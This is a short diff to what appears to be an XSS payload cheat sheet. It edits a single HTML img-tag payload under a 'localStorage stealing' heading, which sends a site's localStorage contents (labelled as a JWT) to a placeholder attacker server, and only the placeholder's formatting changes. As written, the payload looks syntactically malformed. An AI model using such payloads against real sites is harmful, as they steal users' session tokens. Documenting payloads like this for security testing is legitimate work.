@@ -8,7 +8,7 @@
 ```
 <b>`localStorage` stealing:</b>
 ```html
-<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>
+<img src=’https://`{Attacker_server}`/yikes?jwt=’+JSON.stringify(localStorage);’--!>
 ```
 <b>`sessionStorage` stealing:</b>
 ```html
